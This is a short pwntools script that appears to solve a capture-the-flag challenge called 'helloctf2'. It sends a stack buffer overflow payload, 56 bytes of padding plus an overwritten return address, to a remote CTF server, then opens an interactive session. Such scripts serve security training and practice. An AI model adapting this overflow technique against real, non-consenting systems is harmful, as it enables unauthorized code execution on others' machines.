#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import pwnlib
import time

pwn_file = "./helloctf2"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'

c = process(pwn_file)
dbg_script = """
b *0x4005a0 
"""
#gdb.attach(c,dbg_script)
c = remote('ctf.adl.tw', '11002')
c.sendlineafter('CTF', b'A' * (48 + 8) + p64(0x4006d7))
c.interactive()
c.close()
